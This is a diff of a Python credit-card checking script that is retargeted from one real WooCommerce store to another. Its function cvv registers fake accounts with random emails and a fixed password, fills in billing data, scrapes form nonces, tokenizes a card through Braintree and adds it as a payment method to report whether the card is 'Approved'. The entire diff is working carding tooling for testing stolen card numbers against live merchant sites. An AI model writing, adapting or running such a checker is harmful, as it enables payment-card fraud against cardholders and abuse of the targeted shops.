@@ -2545,7 +2545,7 @@ def cvv(ccx):
 		name = ''.join(random.choices(string.ascii_lowercase, k=20))
 		number = ''.join(random.choices(string.digits, k=4))
 				
-		return f"{name}{number}@yahoo.com"
+		return f"{name}{number}@gmail.com"
 	acc = (generate_random_account())
 			
 		
@@ -2577,14 +2577,13 @@ def cvv(ccx):
 	
 	
 	headers = {
-	    'authority': 'thelittlekeepsakecompany.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-    'cache-control': 'max-age=0',
-    'referer': 'https://thelittlekeepsakecompany.com/my-account/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/sign-in/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -2593,51 +2592,42 @@ def cvv(ccx):
     'user-agent': user,
 }
 	
-	response = r.get('https://thelittlekeepsakecompany.com/my-account/', headers=headers)
-	
-	
-	
-	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-	
-	
-	
+	response = r.get('https://shop.trifectanutrition.com/sign-up/', headers=headers)
 	
 	headers = {
-	    'authority': 'thelittlekeepsakecompany.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://thelittlekeepsakecompany.com',
-    'referer': 'https://thelittlekeepsakecompany.com/my-account/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
+	    'accept': '*/*',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'content-type': 'application/json',
+    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkZDM1NWM4YWYyZjgzMDQiLCJ0ciI6ImZhM2I4ZDhmM2RlYTM0NDg1NDczMDkyZDIwYjIxMTFlIiwidGkiOjE3MjQxOTU1MDk1OTl9fQ==',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=1, i',
+    'referer': 'https://shop.trifectanutrition.com/sign-up/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
+    'traceparent': '00-fa3b8d8f3dea34485473092d20b2111e-bdd355c8af2f8304-01',
+    'tracestate': '1724047@nr=0-1-1724047-1117332102-bdd355c8af2f8304----1724195509599',
     'user-agent': user,
 }
 	
-	data = {
+	json_data = {
     'email': acc,
-    'woocommerce-register-nonce': register,
-    '_wp_http_referer': '/my-account/',
-    'register': 'Register',
+    'password': 'a5520055',
 }
 	
-	response = r.post('https://thelittlekeepsakecompany.com/my-account/', headers=headers, data=data)
+	response = r.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email', headers=headers, json=json_data)
 	
 	headers = {
-	    'authority': 'thelittlekeepsakecompany.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-    'referer': 'https://thelittlekeepsakecompany.com/my-account/edit-address/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/account-settings/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -2646,70 +2636,67 @@ def cvv(ccx):
     'user-agent': user,
 }
 	
-	response = r.get('https://thelittlekeepsakecompany.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
+	response = r.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
 	
 	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
 	
 	
 	headers = {
-	    'authority': 'thelittlekeepsakecompany.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
     'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://thelittlekeepsakecompany.com',
-    'referer': 'https://thelittlekeepsakecompany.com/my-account/edit-address/billing/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/edit-address/billing/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': user,
-}
+	'user-agent': user,
+	}
 	
 	data = {
     'billing_first_name': first_name,
     'billing_last_name': last_name,
-    'billing_company': '',
     'billing_country': 'US',
-    'wc_address_validation_postcode_lookup_postcode': '',
     'billing_address_1': street_address,
     'billing_address_2': '',
-    'billing_postcode': zip_code,
     'billing_city': city,
     'billing_state': state,
+    'billing_postcode': zip_code,
     'billing_phone': num,
     'billing_email': acc,
-    'save_address': 'Save address',
     'woocommerce-edit-address-nonce': address,
     '_wp_http_referer': '/my-account/edit-address/billing/',
     'action': 'edit_address',
+    'save_address': 'Save address',
 }
 	
-	response = r.post('https://thelittlekeepsakecompany.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
 	
 	
 	
 	headers = {
-	    'authority': 'thelittlekeepsakecompany.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-    'referer': 'https://thelittlekeepsakecompany.com/my-account/payment-methods/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'priority': 'u=0, i',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': user,
-}
+	    'user-agent': user,
+	}
 	
-	response = r.get('https://thelittlekeepsakecompany.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
+	response = r.get('https://shop.trifectanutrition.com/my-account/add-payment-method', cookies=r.cookies, headers=headers)
 	
 	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
 	
@@ -2718,18 +2705,21 @@ def cvv(ccx):
 	
 	
 	headers = {
-	    'authority': 'thelittlekeepsakecompany.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+	    'accept': '*/*',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://thelittlekeepsakecompany.com',
-    'referer': 'https://thelittlekeepsakecompany.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkOWZhODI1OTA4N2JmM2QiLCJ0ciI6ImM4ZmUxODU3ZDQ2OWE4M2E4MmExNTcxOTY0ZDQ1YTZjIiwidGkiOjE3MjQxOTU1NjE2NzR9fQ==',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=1, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
+    'traceparent': '00-c8fe1857d469a83a82a1571964d45a6c-bd9fa8259087bf3d-01',
+    'tracestate': '1724047@nr=0-1-1724047-1117332102-bd9fa8259087bf3d----1724195561674',
     'user-agent': user,
 }
 		
@@ -2738,7 +2728,7 @@ def cvv(ccx):
     'nonce': client,
 }
 		
-	response = r.post('https://thelittlekeepsakecompany.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
 	
 	enc = response.json()['data']
 	
@@ -2749,17 +2739,17 @@ def cvv(ccx):
 	
 		
 	headers = {
-		    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+		    'accept': '*/*',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
     'authorization': f'Bearer {au}',
     'braintree-version': '2018-05-10',
     'content-type': 'application/json',
     'origin': 'https://assets.braintreegateway.com',
+    'priority': 'u=1, i',
     'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
@@ -2767,10 +2757,10 @@ def cvv(ccx):
 }
 		
 	json_data = {
-    'clientSdkMetadata': {
+		    'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '63cd6242-6348-47de-9ced-9e74221c26ee',
+        'sessionId': '95a6ff57-7691-4527-9e6a-dc6066499130',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -2800,16 +2790,16 @@ def cvv(ccx):
 	
 	
 	headers = {
-    'authority': 'thelittlekeepsakecompany.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
     'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://thelittlekeepsakecompany.com',
-    'referer': 'https://thelittlekeepsakecompany.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
+    'origin': 'https://shop.trifectanutrition.com',
+    'priority': 'u=0, i',
+    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -2832,9 +2822,8 @@ def cvv(ccx):
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
-
 		
-	response = r.post('https://thelittlekeepsakecompany.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+	response = r.post('https://shop.trifectanutrition.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
 				
 			
 		
@@ -2859,8 +2848,6 @@ def cvv(ccx):
 			return 'Approved'
 	else:
 		return result
-def sq(card):
-	return 'Your card was declined.'
 	
 #Strip CH	
 	
